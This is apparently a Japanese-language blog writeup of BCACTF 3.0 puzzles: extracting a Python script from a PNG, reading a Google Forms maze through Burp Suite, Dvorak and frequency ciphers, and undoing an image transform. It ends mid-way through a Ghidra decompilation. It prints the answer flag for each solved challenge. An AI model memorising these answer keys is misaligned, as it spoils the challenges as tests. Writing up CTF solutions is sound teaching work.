<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>BCACTF 3.0 Writeup - CTF フラxxグゲット</title>
  <meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">


<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://play.bcactf.com/challenges BCACTF 1.0、BCACTF 2.0 と毎回参加してきたので、ちょっと忙しかったんですが、今回の3.0も参加させてもらいまし" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />



<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />


<meta name="generator" content="Hugo 0.74.2 with theme even" />


<link rel="canonical" href="https://captureamerica.github.io/writeups/post/bcactf_2022/" />
<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">



<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">



<meta property="og:title" content="BCACTF 3.0 Writeup" />
<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://play.bcactf.com/challenges BCACTF 1.0、BCACTF 2.0 と毎回参加してきたので、ちょっと忙しかったんですが、今回の3.0も参加させてもらいまし" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://captureamerica.github.io/writeups/post/bcactf_2022/" />
<meta property="article:published_time" content="2022-06-07T15:00:00+09:00" />
<meta property="article:modified_time" content="2022-06-07T15:00:00+09:00" />
<meta itemprop="name" content="BCACTF 3.0 Writeup">
<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://play.bcactf.com/challenges BCACTF 1.0、BCACTF 2.0 と毎回参加してきたので、ちょっと忙しかったんですが、今回の3.0も参加させてもらいまし">
<meta itemprop="datePublished" content="2022-06-07T15:00:00&#43;09:00" />
<meta itemprop="dateModified" content="2022-06-07T15:00:00&#43;09:00" />
<meta itemprop="wordCount" content="2989">



<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="BCACTF 3.0 Writeup"/>
<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://play.bcactf.com/challenges BCACTF 1.0、BCACTF 2.0 と毎回参加してきたので、ちょっと忙しかったんですが、今回の3.0も参加させてもらいまし"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->

</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <a href="https://captureamerica.github.io/writeups/">
        <li class="mobile-menu-item">Home</li>
      </a><a href="https://captureamerica.github.io/writeups/post/">
        <li class="mobile-menu-item">Archives</li>
      </a><a href="https://captureamerica.github.io/writeups/tags/">
        <li class="mobile-menu-item">Tags</li>
      </a><a href="https://captureamerica.github.io/writeups/categories/">
        <li class="mobile-menu-item">Categories</li>
      </a><a href="https://captureamerica.github.io/writeups/about/">
        <li class="mobile-menu-item">About</li>
      </a>
  </ul>

  


</nav>

  <div class="container" id="mobile-panel">
    <header id="header" class="header">
        <div class="logo-wrapper">
  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
</div>





<nav class="site-navbar">
  <ul id="menu" class="menu">
    <li class="menu-item">
        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
      </li>
  </ul>
</nav>

    </header>

    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <article class="post">
    
    <header class="post-header">
      <h1 class="post-title">BCACTF 3.0 Writeup</h1>

      <div class="post-meta">
        <span class="post-time"> 2022-06-07 </span>
        <div class="post-category">
            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
            </div>
        
      </div>
    </header>

    <div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Contents</h2>
  <div class="post-toc-content">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#misc-blender-creation-150-points">[Misc]: Blender Creation (150 points)</a>
      <ul>
        <li><a href="#challenge">Challenge</a></li>
        <li><a href="#solution">Solution</a></li>
      </ul>
    </li>
    <li><a href="#misc-gogle-maze-175-points">[Misc]: Gogle Maze (175 points)</a>
      <ul>
        <li><a href="#challenge-1">Challenge</a></li>
        <li><a href="#solution-1">Solution</a></li>
      </ul>
    </li>
    <li><a href="#crypto-new-keyboard-50-points">[Crypto]: New Keyboard (50 points)</a>
      <ul>
        <li><a href="#challenge-2">Challenge</a></li>
        <li><a href="#solution-2">Solution</a></li>
      </ul>
    </li>
    <li><a href="#crypto-hidden-frequencies-100-points">[Crypto]: Hidden Frequencies (100 points)</a>
      <ul>
        <li><a href="#challenge-3">Challenge</a></li>
        <li><a href="#solution-3">Solution</a></li>
      </ul>
    </li>
    <li><a href="#rev-glassed-over-75-points">[Rev]: Glassed Over (75 points)</a>
      <ul>
        <li><a href="#challenge-4">Challenge</a></li>
        <li><a href="#solution-4">Solution</a></li>
      </ul>
    </li>
    <li><a href="#rev-my-very-flag-checker-150-points">[Rev]: My Very Flag Checker (150 points)</a>
      <ul>
        <li><a href="#challenge-5">Challenge</a></li>
        <li><a href="#solution-5">Solution</a></li>
      </ul>
    </li>
    <li><a href="#web-bcactf-30-story-mode-150-points">[Web]: BCACTF 3.0: Story Mode (150 points)</a>
      <ul>
        <li><a href="#challenge-6">Challenge</a></li>
        <li><a href="#solution-6">Solution</a></li>
      </ul>
    </li>
    <li><a href="#web-blatant-sqli-175-points">[Web]: Blatant SQLi (175 points)</a>
      <ul>
        <li><a href="#challenge-7">Challenge</a></li>
        <li><a href="#solution-7">Solution</a></li>
      </ul>
    </li>
    <li><a href="#web-query-service-175-points">[Web]: Query Service (175 points)</a>
      <ul>
        <li><a href="#challenge-8">Challenge</a></li>
        <li><a href="#solution-8">Solution</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>
    <div class="post-content">
      <img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
<div class='align-right'>
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fbcactf_2022%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
</div>
<p>URL: <a href="https://play.bcactf.com/challenges">https://play.bcactf.com/challenges</a>
<br /><br /></p>
<p><a href="https://captureamerica.github.io/writeups/post/bcactf_2019/">BCACTF 1.0</a>、<a href="https://captureamerica.github.io/writeups/post/bcactf_2021/">BCACTF 2.0</a> と毎回参加してきたので、ちょっと忙しかったんですが、今回の3.0も参加させてもらいました</p>
<p>3575点を獲得し、最終順位は54位でした。<br /></p>
<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_score.png" alt="bcactf_2022_score.png">
<p><br><br></p>
<p>以下はチャレンジのリストです。<br /></p>
<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_solves1.png" alt="bcactf_2022_solves1.png">
<br>
<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_solves2.png" alt="bcactf_2022_solves2.png">
<br>
<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_solves3.png" alt="bcactf_2022_solves3.png">
<br>
<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_solves4.png" alt="bcactf_2022_solves4.png">
<br>
<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_solves5.png" alt="bcactf_2022_solves5.png">
<p><br /></p>
<p>このCTFサイト、ちょっとリソースを食うみたいで、時々パソコンが結構重く感じました。。。</p>
<p><br /><br />
<br /><br /></p>
<h2 id="misc-blender-creation-150-points">[Misc]: Blender Creation (150 points)</h2>
<hr>
<h3 id="challenge">Challenge</h3>
<blockquote>
<p>I&rsquo;m learning how to use Blender, and if I&rsquo;m being honest I have no idea what I&rsquo;m doing. Here&rsquo;s a render of something I made, not exactly sure what it is though.
<br /><br />
Hint1: Open the image in a text editor
<br />
Hint2: Research the library used</p>
</blockquote>
<p>Attachment:</p>
<ul>
<li>chall.png</li>
</ul>
<br>
<h3 id="solution">Solution</h3>
<p>バイナリエディタでファイル開くと末尾にPythonコードが付いていることがわかります。ddコマンドで取り出します。</p>
<pre>
$ dd if=chall.png of=out.py bs=1 skip=0x00125808
1959+0 records in
1959+0 records out
1959 bytes transferred in 0.144385 secs (13568 bytes/sec)
</pre>
<p><br /></p>
<p>実行してみると、&lsquo;bpy&rsquo;というモジュールが無いというエラーが出ます。</p>
<pre>
$ python3 out.py

Traceback (most recent call last):
  File "/xxxx/out.py", line 1, in <module>
    import bpy
ModuleNotFoundError: No module named 'bpy'
</pre>
<p><br /></p>
<p>ググって調べてみると、Blenderの中じゃないと &lsquo;bpy&rsquo; モジュールは使えない、という情報を見つけました。</p>
<p>確かに、チャレンジのタイトルが Blender でしたね。</p>
<p><br /></p>
<p>Blender というのは使ったことなかったのですが、3Dモデリング ツールということなので、フラグが3Dで得られると予想。</p>
<p>ということで、まず Blender をインストールし、その後、さきほど得られたPythonコードを読み込んで実行すると、フラグが得られました。</p>
<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_blender.png" alt="bcactf_2022_blender.png">
<p><br /></p>
<p>Flag: <code>bcactf{b13NdR__pXYtH0N_4ND_f0r3N}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="misc-gogle-maze-175-points">[Misc]: Gogle Maze (175 points)</h2>
<hr>
<h3 id="challenge-1">Challenge</h3>
<blockquote>
<p>Make it to the end of my <a href="https://forms.gle/E6WfJUuf7DLpvySo8">endless maze</a> to get the flag!
<br /><br />
Hint1: How does Google know where you are and where you&rsquo;ve been?</p>
</blockquote>
<br>
<h3 id="solution-1">Solution</h3>
<p>Google Formを使った Maze ということらしいです。</p>
<p>想定解じゃないと思うんですが、Burp Suiteでレスポンスを見てたら、フラグが出てきていました。</p>
<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_googlemaze.png" alt="bcactf_2022_googlemaze.png">
<p><br /></p>
<p>なお、Google Formでは、Google Accountを使わなくてもフラグは得られました。</p>
<p><br /></p>
<p>Flag: <code>bcactf{f4rthER_th4n_m3eTS_th3_EY3_9928ef}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="crypto-new-keyboard-50-points">[Crypto]: New Keyboard (50 points)</h2>
<hr>
<h3 id="challenge-2">Challenge</h3>
<blockquote>
<p>I bought a new keyboard, but it looks like it&rsquo;s typing gibberish!
<br /><br />
Hint1: My keyboard&rsquo;s not broken
<br />
Hint2: I just need to get used to it.
<br />
Hint3: It uses a different layout from most keyboards.
<br />
Hint4: Don&rsquo;t use dCode. dCode is broken.</p>
</blockquote>
<p>Attachment:</p>
<ul>
<li>chall.txt</li>
</ul>
<p>中身：</p>
<pre>
Cy ygpbo rgy ydco t.fxrape go.o yd. Ekrpat nafrgy! Cy p.annf m.oo.o gl mf mgojn. m.mrpfv Yd. unai co xjajyu?t3fx0ape{naf0g7{jdabi3gl{',.pyf+
</pre>
<br>
<h3 id="solution-2">Solution</h3>
<p>結構多くの人が解いているのに、自分はなかなか解けなくて後回しにしていたやつです。</p>
<p>最初は Hint2 までしかなかったんですが、途中で Hint3 と Hint4 が追加されました。</p>
<p>確かに、<a href="https://www.dcode.fr/keyboard-shift-cipher">dCode</a> では、うまくフラグが得られなかったんですよね。</p>
<p><br /></p>
<p>以下のサイトにお世話になりました。</p>
<p><a href="https://www.geocachingtoolbox.com/index.php?lang=en&amp;page=dvorakKeyboard">https://www.geocachingtoolbox.com/index.php?lang=en&amp;page=dvorakKeyboard</a></p>
<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_keyboard.png" alt="bcactf_2022_keyboard.png">
<p><br /></p>
<p>Flag: <code>bcactf{k3yb0ard_lay0u7_chang3up_qwerty}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="crypto-hidden-frequencies-100-points">[Crypto]: Hidden Frequencies (100 points)</h2>
<hr>
<h3 id="challenge-3">Challenge</h3>
<blockquote>
<p>I downloaded one of my friend&rsquo;s files and he got really defensive&hellip; it looks like gibberish but I think there might be more to it.
<br /><br />
Hint1: Do all characters appear the same number of times?</p>
</blockquote>
<p>Attachment:</p>
<ul>
<li>msg.txt</li>
</ul>
<p>中身：</p>
<pre>
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggghhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiijjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkllllllllllllllllllllllllllllllllllllllllllllllllllllmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnoooooooooooooooooooooooooooooooooooooooooooooooooooppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrsssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssstttttttttttttttttttttttttttttttttttttttttttttttttttuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111122222222222222222222222222222222222222222222222222222333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444444444444444455555555555555555555555555555555555555555555555566666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777888888888888888888888888888888888888888888888888999999999999999999999999999999999999999999999999............................................................................................................???????????????????????????????????????????????????????????????????????????????????????????????!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#####################################################################################################$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
</pre>
<br>
<h3 id="solution-3">Solution</h3>
<p>まぁ、タイトルとヒントのそのままです。それぞれの文字の出現回数を調べて、その数字を文字に変換するだけです。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
<span class="kn">import</span> <span class="nn">string</span><span class="o">,</span> <span class="nn">sys</span>

<span class="n">chars</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s1">&#39;.?!&lt;&gt;@#$%^&amp;&#39;</span><span class="p">)</span>
<span class="n">msg</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;msg.txt&#34;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
    <span class="n">n</span> <span class="o">=</span> <span class="n">msg</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p><br /></p>
<p>Flag: <code>bcactf{ch4r4ct3r_fr3qu3ncy_15_50_c00l_55aFejnb}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="rev-glassed-over-75-points">[Rev]: Glassed Over (75 points)</h2>
<hr>
<h3 id="challenge-4">Challenge</h3>
<blockquote>
<p>I created a new way to hide images, see if you can reverse it and find the flag.
<br /><br />
Hint1: Carefully read through the javascript file to see if you can figure out what&rsquo;s happening.
<br />
Hint2: The result may not be perfect, but it should be mostly legible</p>
</blockquote>
<p>Attachment:</p>
<ul>
<li>modifiedflag.png</li>
<li>index.js</li>
</ul>
<p>中身：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-Javascript" data-lang="Javascript"><span class="kr">const</span> <span class="nx">jimp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;jimp&#39;</span><span class="p">);</span>

<span class="nx">async</span> <span class="kd">function</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">image</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">jimp</span><span class="p">.</span><span class="nx">read</span><span class="p">(</span><span class="s1">&#39;flag.png&#39;</span><span class="p">);</span>
    <span class="kr">const</span> <span class="nx">width</span> <span class="o">=</span> <span class="nx">image</span><span class="p">.</span><span class="nx">bitmap</span><span class="p">.</span><span class="nx">width</span><span class="p">;</span>
    <span class="kr">const</span> <span class="nx">height</span> <span class="o">=</span> <span class="nx">image</span><span class="p">.</span><span class="nx">bitmap</span><span class="p">.</span><span class="nx">height</span><span class="p">;</span>
    
    <span class="nx">image</span><span class="p">.</span><span class="nx">scan</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">width</span><span class="p">,</span> <span class="nx">height</span><span class="p">,</span> <span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">,</span> <span class="nx">idx</span><span class="p">)=&gt;{</span>
        <span class="c1">// var red = image.bitmap.data[idx];
</span><span class="c1"></span>        <span class="c1">// var green = image.bitmap.data[idx + 1];
</span><span class="c1"></span>        <span class="c1">// var blue = image.bitmap.data[idx + 2];
</span><span class="c1"></span>        <span class="c1">// var alpha = image.bitmap.data[idx + 3];
</span><span class="c1"></span>        
        <span class="nx">image</span><span class="p">.</span><span class="nx">bitmap</span><span class="p">.</span><span class="nx">data</span><span class="p">[</span><span class="nx">idx</span><span class="o">+</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">12</span><span class="p">;</span>
        <span class="nx">image</span><span class="p">.</span><span class="nx">bitmap</span><span class="p">.</span><span class="nx">data</span><span class="p">[</span><span class="nx">idx</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">-=</span> <span class="mi">129</span><span class="p">;</span>
        <span class="nx">image</span><span class="p">.</span><span class="nx">bitmap</span><span class="p">.</span><span class="nx">data</span><span class="p">[</span><span class="nx">idx</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">-=</span> <span class="mi">68</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="nx">x</span> <span class="o">==</span> <span class="nx">image</span><span class="p">.</span><span class="nx">bitmap</span><span class="p">.</span><span class="nx">width</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">y</span> <span class="o">==</span> <span class="nx">image</span><span class="p">.</span><span class="nx">bitmap</span><span class="p">.</span><span class="nx">height</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">image</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&#34;modifiedflag.png&#34;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">});</span>

<span class="p">}</span>
<span class="nx">main</span><span class="p">();</span>
</code></pre></td></tr></table>
</div>
</div><br>
<h3 id="solution-4">Solution</h3>
<p>コードを見てみると、アルファチャンネルにランダム値を入れていて、green と blue のところは固定値で差分ととっていて、redはそのままになっています。</p>
<p>逆の処理をしたら、green と blue は元に戻りますね。</p>
<p><br /></p>
<p>ただ、実際のところは green と blue を元に戻さなくても、アルファチャンネルを無効にしてしまえばフラグは見えます。</p>
<p>以下は、modifiedflag.png に対して「青い空を見上げればいつもそこに白い猫」を使ってアルファチャンネルを無効にしたところです。</p>
<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_glassedover.png" alt="bcactf_2022_glassedover.png">
<p><br /></p>
<p>Flag: <code>bcactf{b!gG3r_!mg_29354758}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="rev-my-very-flag-checker-150-points">[Rev]: My Very Flag Checker (150 points)</h2>
<hr>
<h3 id="challenge-5">Challenge</h3>
<blockquote>
<p>Welcome to &ldquo;My Very Flag Checker&rdquo;, run my program with the flag and it&rsquo;ll tell you if it&rsquo;s correct!
<br /><br />
Hint1: How do you disassemble this binary?</p>
</blockquote>
<p>Attachment:</p>
<ul>
<li>whatisflag (ELF 64bit)</li>
</ul>
<br>
<h3 id="solution-5">Solution</h3>
<p>Ghidraでコードを確認します。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="hl"><span class="lnt">16
</span></span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">param_1</span><span class="p">,</span><span class="n">undefined8</span> <span class="o">*</span><span class="n">param_2</span><span class="p">)</span>

